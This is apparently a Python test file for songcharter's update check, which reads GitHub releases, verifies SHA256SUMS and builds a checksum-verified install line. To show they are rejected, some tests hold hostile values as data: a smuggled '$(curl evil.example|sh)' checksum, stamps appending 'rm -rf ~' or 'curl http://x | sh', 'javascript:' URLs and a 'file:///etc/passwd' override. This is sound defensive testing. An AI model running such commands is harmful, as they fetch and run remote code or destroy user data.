"""The update check (songcharter.updates, M5-07) with a stand-in for urllib's opener: no test here reaches the
network. Made-up releases and SHA-256s only."""
import io
import json
import socket
import urllib.error
from pathlib import Path

import pytest

from songcharter import updates as U

ROOT = Path(__file__).resolve().parents[1]
SHA = "0123456789abcdef" * 4          # install.sh's, in the made-up SHA256SUMS
OTHER = "fedcba9876543210" * 4        # the tarball's
API = U.RELEASES_URL


def release(tag, *, prerelease=True, draft=False, sums=True):
    """A release as GitHub's API lists it (the fields the check reads, and a few it does not)."""
    base = f"https://github.com/neb882/song-charting/releases/download/{tag}"
    assets = [{"name": "install.sh", "browser_download_url": f"{base}/install.sh", "size": 21646}]
    if sums:
        assets.append({"name": "SHA256SUMS", "browser_download_url": f"{base}/SHA256SUMS", "size": 168})
    return {"tag_name": tag, "name": f"songcharter {tag[1:]} (WSL)", "draft": draft, "prerelease": prerelease,
            "html_url": f"https://github.com/neb882/song-charting/releases/tag/{tag}", "assets": assets}


def sums_url(tag):
    return f"https://github.com/neb882/song-charting/releases/download/{tag}/SHA256SUMS"


def sums(version, sha=SHA):
    return f"{sha}  install.sh\n{OTHER}  songcharter-{version}.tar.gz\n".encode()


class Web:
    """urlopen's stand-in: url -> bytes, or an exception to raise; anything else is a 404. It keeps every request."""

    def __init__(self, pages=None):
        self.pages = dict(pages or {})
        self.asked = []

    def __call__(self, request, timeout=None):
        self.asked.append({"url": request.full_url, "agent": request.get_header("User-agent"),
                           "accept": request.get_header("Accept"), "timeout": timeout})
        page = self.pages.get(request.full_url)
        if isinstance(page, BaseException):
            raise page
        if page is None:
            raise urllib.error.HTTPError(request.full_url, 404, "Not Found", {}, None)
        return io.BytesIO(page)

    @property
    def urls(self):
        return [a["url"] for a in self.asked]


def nothing(request, timeout=None):
    raise AssertionError(f"a request was made: {request.full_url}")


def web(*releases, extra=None):
    pages = {API: json.dumps(list(releases)).encode()}
    for r in releases:
        pages[sums_url(r["tag_name"])] = sums(r["tag_name"][1:])
    pages.update(extra or {})
    return Web(pages)


def stamp(home):
    return json.loads((home / "state" / "update.json").read_text(encoding="utf-8"))


@pytest.fixture(autouse=True)
def no_override(monkeypatch):
    monkeypatch.delenv("SONGCHARTER_RELEASES_URL", raising=False)
    monkeypatch.delenv("SONGCHARTER_OFFLINE", raising=False)


def line(version, sha=SHA):
    return (f"curl -fsSLO https://github.com/neb882/song-charting/releases/download/v{version}/install.sh && "
            f"echo \"{sha}  install.sh\" | sha256sum -c - && bash install.sh")


def test_a_newer_release_gives_the_guides_line_with_its_sha_and_tag(tmp_path):
    w = web(release("v0.2.0", prerelease=False), release("v0.1.0"))
    got = U.check(tmp_path, "0.1.0", opener=w, now=1000.0)
    assert got == {"checked": 1000.0, "version": "0.1.0", "latest": "0.2.0", "line": line("0.2.0"),
                   "url": "https://github.com/neb882/song-charting/releases/tag/v0.2.0"}
    assert stamp(tmp_path) == got
    assert w.urls == [API, sums_url("v0.2.0")]
    assert all(a["agent"] == "songcharter/0.1.0" and a["timeout"] == 5.0 for a in w.asked)   # nothing else in it
    assert w.asked[0]["accept"] == "application/vnd.github+json"
    # exactly the guide's line, as build.sh fills it in (docs/guide/windows-wsl.md, section 3)
    guide = (ROOT / "docs" / "guide" / "windows-wsl.md").read_text(encoding="utf-8")
    template = next(x for x in guide.splitlines() if x.startswith("curl "))
    assert got["line"] == template.replace("{{VERSION}}", "0.2.0").replace("{{INSTALL_SHA256}}", SHA)


def test_the_same_or_an_older_version_gives_none_and_a_stamp(tmp_path):
    for version in ("0.2.0", "0.2", "0.3.0", "1.0"):
        home = tmp_path / version
        w = web(release("v0.2.0"), release("v0.1.0"))
        assert U.check(home, version, opener=w, now=50.0) is None
        assert stamp(home) == {"checked": 50.0, "version": version, "latest": "0.2.0", "line": None, "url": None}
        assert w.urls == [API]   # no SHA256SUMS fetched for it


def test_a_newer_pre_release_counts(tmp_path):
    got = U.check(tmp_path, "0.1.0", opener=web(release("v0.2.0", prerelease=True)), now=1.0)
    assert got["latest"] == "0.2.0" and got["line"] == line("0.2.0")


def test_a_tag_with_a_suffix_or_a_draft_does_not_count(tmp_path):
    for i, tag in enumerate(("v0.3.0-ci-abc1234", "v0.3.0rc1", "0.3.0", "v0.3.0.", "v", "V0.3.0", "v0..3", " v0.3.0")):
        home = tmp_path / str(i)
        assert U.check(home, "0.2.0", opener=web(release(tag), release("v0.2.0")), now=1.0) is None, tag
        assert stamp(home)["latest"] == "0.2.0", tag
    assert U.check(tmp_path / "draft", "0.2.0", opener=web(release("v0.3.0", draft=True), release("v0.2.0")),
                   now=1.0) is None
    assert stamp(tmp_path / "draft")["latest"] == "0.2.0"
    assert U.check(tmp_path / "none", "0.2.0", opener=web(release("v0.3.0-ci-x")), now=1.0) is None
    assert stamp(tmp_path / "none") == {"checked": 1.0, "version": "0.2.0", "latest": None, "line": None, "url": None}


def test_only_ascii_digits_of_a_bounded_length_count(tmp_path):
    for i, tag in enumerate(("v\u0669.\u0669", "v\uff19.\uff19", "v" + "9" * 5000, "v0." + "9" * 10, "v" + ".1" * 11)):
        home = tmp_path / str(i)
        assert U.check(home, "0.2.0", opener=web(release(tag), release("v0.2.0")), now=1.0) is None, tag[:12]
        assert stamp(home)["latest"] == "0.2.0", tag[:12]   # answered and kept: not asked again at every start
    assert U.parse("9" * 9) == (999999999,) and U.parse("1" + ".1" * 9) is not None


def test_a_parse_error_is_a_failure_with_its_stamp(tmp_path, monkeypatch):
    def broken(version):
        raise ValueError("Exceeds the limit (4300 digits) for integer string conversion")
    monkeypatch.setattr(U, "parse", broken)
    assert U.check(tmp_path, "0.1.0", opener=web(release("v0.2.0")), now=1.0) is None
    assert stamp(tmp_path)["error"] == ("the releases' answer: ValueError: Exceeds the limit (4300 digits) for "
                                        "integer string conversion")


def test_the_release_page_is_always_githubs_tag_page(tmp_path):
    for i, page in enumerate(("https://evil.example/v0.2.0", "http://github.com/x", "javascript:alert(1)", None)):
        r = {**release("v0.2.0"), "html_url": page}
        got = U.check(tmp_path / str(i), "0.1.0", opener=web(r), now=1.0)
        assert got["url"] == "https://github.com/neb882/song-charting/releases/tag/v0.2.0", page
    path = tmp_path / "0" / "state" / "update.json"
    path.write_text(json.dumps({**got, "url": "https://evil.example/v0.2.0"}), encoding="utf-8")   # nor a stamp's
    assert U.check(tmp_path / "0", "0.1.0", opener=web(release("v0.2.0")), now=2.0)["url"] == got["url"]


def test_the_newest_is_the_highest_version_wherever_it_is_listed(tmp_path):
    w = web(release("v0.9.0"), release("v0.10.0"), release("v0.2.0"))
    assert U.check(tmp_path, "0.9", opener=w, now=1.0)["latest"] == "0.10.0"


def test_without_a_readable_sha256sums_only_the_release_page(tmp_path):
    page = "https://github.com/neb882/song-charting/releases/tag/v0.2.0"
    cases = {"no asset": web(release("v0.2.0", sums=False)),
             "a 404": web(release("v0.2.0"), extra={sums_url("v0.2.0"): None}),
             "cut off": web(release("v0.2.0"), extra={sums_url("v0.2.0"): urllib.error.URLError("reset")}),
             "no install.sh line": web(release("v0.2.0"), extra={sums_url("v0.2.0"): f"{OTHER}  x.tar.gz\n".encode()}),
             "not a SHA-256": web(release("v0.2.0"), extra={sums_url("v0.2.0"): b"0123  install.sh\n"}),
             # 64 characters, but not hex: what a hostile SHA256SUMS would put into the line the friend pastes
             "a command": web(release("v0.2.0"), extra={sums_url("v0.2.0"): b'$(curl evil.example|sh);"`x` ' +
                                                        b"a" * 35 + b"  install.sh\n"}),
             "upper case": web(release("v0.2.0"), extra={sums_url("v0.2.0"): SHA.upper().encode() + b"  install.sh\n"}),
             "too long": web(release("v0.2.0"), extra={sums_url("v0.2.0"): sums("0.2.0") + b" " * U.MAX_SUMS})}
    assert len(b'$(curl evil.example|sh);"`x` ' + b"a" * 35) == 64
    for name, w in cases.items():
        home = tmp_path / name.replace(" ", "-")
        got = U.check(home, "0.1.0", opener=w, now=1.0)
        assert got == {"checked": 1.0, "version": "0.1.0", "latest": "0.2.0", "line": None, "url": page}, name
        assert stamp(home) == got, name


def test_an_answer_under_a_day_old_is_kept_without_a_request(tmp_path):
    first = U.check(tmp_path, "0.1.0", opener=web(release("v0.2.0")), now=1000.0)
    said = []
    assert U.check(tmp_path, "0.1.0", opener=nothing, now=1000.0 + U.CHECK_EVERY_S - 1, say=said.append) == first
    assert said == [f"update check, 23 h ago: songcharter 0.2.0 is out (this is 0.1.0): {first['url']}"]
    U.check(tmp_path / "none", "0.2.0", opener=web(release("v0.2.0")), now=1000.0)
    assert U.check(tmp_path / "none", "0.2.0", opener=nothing, now=2000.0) is None   # "no newer" is kept too
    again = web(release("v0.3.0"))
    assert U.check(tmp_path, "0.1.0", opener=again, now=1000.0 + U.CHECK_EVERY_S)["latest"] == "0.3.0"   # a day on
    assert again.urls == [API, sums_url("v0.3.0")]
    other = web(release("v0.3.0"))
    assert U.check(tmp_path, "0.2.0", opener=other, now=1000.0 + U.CHECK_EVERY_S + 1)["latest"] == "0.3.0"
    assert other.urls[0] == API   # a stamp for another version (the update installed) does not answer
    future = web(release("v0.4.0"))
    assert U.check(tmp_path, "0.2.0", opener=future, now=10.0)["latest"] == "0.4.0"   # a stamp from the future


def test_a_stamp_that_is_not_one_of_ours_is_not_shown(tmp_path):
    good = U.check(tmp_path, "0.1.0", opener=web(release("v0.2.0")), now=1000.0)
    path = tmp_path / "state" / "update.json"
    for bad in ({**good, "line": good["line"] + "; rm -rf ~"}, {**good, "line": "curl http://x | sh"},
                {**good, "url": "javascript:alert(1)"}, {**good, "latest": "0.2.0-x"}, {**good, "checked": "1000"},
                {**good, "checked": True}, {**good, "latest": "0.1.0"}, [good], "nonsense"):
        path.write_text(json.dumps(bad) if bad != "nonsense" else "{nonsense", encoding="utf-8")
        w = web(release("v0.2.0"))
        assert U.check(tmp_path, "0.1.0", opener=w, now=1001.0) == {**good, "checked": 1001.0}, bad
        assert w.urls == [API, sums_url("v0.2.0")], bad


def test_any_failure_gives_none_and_waits_an_hour(tmp_path):
    failures = {"offline": urllib.error.URLError(OSError(101, "Network is unreachable")),
                "a timeout": socket.timeout("timed out"), "a timeout (3.10+)": TimeoutError("timed out"),
                "a 403": urllib.error.HTTPError(API, 403, "rate limit exceeded", {}, None),
                "a 500": urllib.error.HTTPError(API, 500, "Server Error", {}, None),
                "not JSON": b"<html>a captive portal</html>", "not a list": b'{"message": "Not Found"}',
                "not UTF-8": b"\xff\xfe[]", "too long": b"[" + b" " * U.MAX_RELEASES + b"]"}
    for name, failure in failures.items():
        home = tmp_path / name.replace(" ", "-")
        said = []
        assert U.check(home, "0.1.0", opener=Web({API: failure}), now=100.0, say=said.append) is None, name
        s = stamp(home)
        assert set(s) == {"checked", "version", "error"} and s["checked"] == 100.0 and s["version"] == "0.1.0", name
        assert said[0].startswith("update check failed: ") and said[0].endswith(
            "; the next try is an hour away at the earliest"), name
        assert U.check(home, "0.1.0", opener=nothing, now=100.0 + U.RETRY_AFTER_S - 1) is None, name
    w = web(release("v0.2.0"))
    assert U.check(tmp_path / "offline", "0.1.0", opener=w, now=100.0 + U.RETRY_AFTER_S)["latest"] == "0.2.0"
    assert w.urls == [API, sums_url("v0.2.0")]
    U.check(tmp_path / "skew", "0.1.0", opener=Web({API: TimeoutError("timed out")}), now=5000.0)
    assert U.check(tmp_path / "skew", "0.1.0", opener=web(release("v0.2.0")), now=10.0)["latest"] == "0.2.0"   # a
    # failure dated in the future (the clock moved back, as WSL's can after a sleep) does not block the check


def test_offline_never_asks(tmp_path, monkeypatch):
    monkeypatch.setenv("SONGCHARTER_OFFLINE", "1")
    said = []
    assert U.check(tmp_path, "0.1.0", opener=nothing, now=1.0, say=said.append) is None
    assert not (tmp_path / "state").exists() and said == ["update check: not made (SONGCHARTER_OFFLINE=1)"]
    monkeypatch.delenv("SONGCHARTER_OFFLINE")
    first = U.check(tmp_path, "0.1.0", opener=web(release("v0.2.0")), now=1.0)
    monkeypatch.setenv("SONGCHARTER_OFFLINE", "1")
    assert U.check(tmp_path, "0.1.0", opener=nothing, now=2.0) == first   # an answer under a day old still answers
    assert U.check(tmp_path, "0.1.0", opener=nothing, now=2.0 + U.CHECK_EVERY_S) is None


def test_the_releases_url_and_its_override(tmp_path, monkeypatch):
    assert U.RELEASES_URL == "https://api.github.com/repos/neb882/song-charting/releases?per_page=10"
    local = "http://127.0.0.1:8000/releases.json"
    monkeypatch.setenv("SONGCHARTER_RELEASES_URL", local)
    w = Web({local: json.dumps([release("v9.9.9")]).encode(), sums_url("v9.9.9"): sums("9.9.9")})
    assert U.check(tmp_path, "0.1.0", opener=w, now=1.0)["line"] == line("9.9.9")
    assert w.urls == [local, sums_url("v9.9.9")]
    for i, url in enumerate(("file:///etc/passwd", "ftp://example.invalid/r.json")):   # http and https only
        monkeypatch.setenv("SONGCHARTER_RELEASES_URL", url)
        assert U.check(tmp_path / str(i), "0.1.0", opener=nothing, now=1.0) is None
        assert stamp(tmp_path / str(i))["error"] == f"{url} is not an http or https URL"


def test_versions_compare_as_integers():
    assert U.parse("0.2.0") == U.parse("0.2") == (0, 2) and U.parse("0.10.0") > U.parse("0.9.9")
    assert U.parse("0") == (0,) and U.parse("0.0") == (0,)
    for bad in ("", "0.2.0-ci-abc", "v0.2.0", "0.2.", ".2", "0.2a", "0..2", None, 2):
        assert U.parse(bad) is None, bad
    assert U.newer("0.10", "0.9") and not U.newer("0.2.0", "0.2") and not U.newer("0.3", "0.3.0-dev")
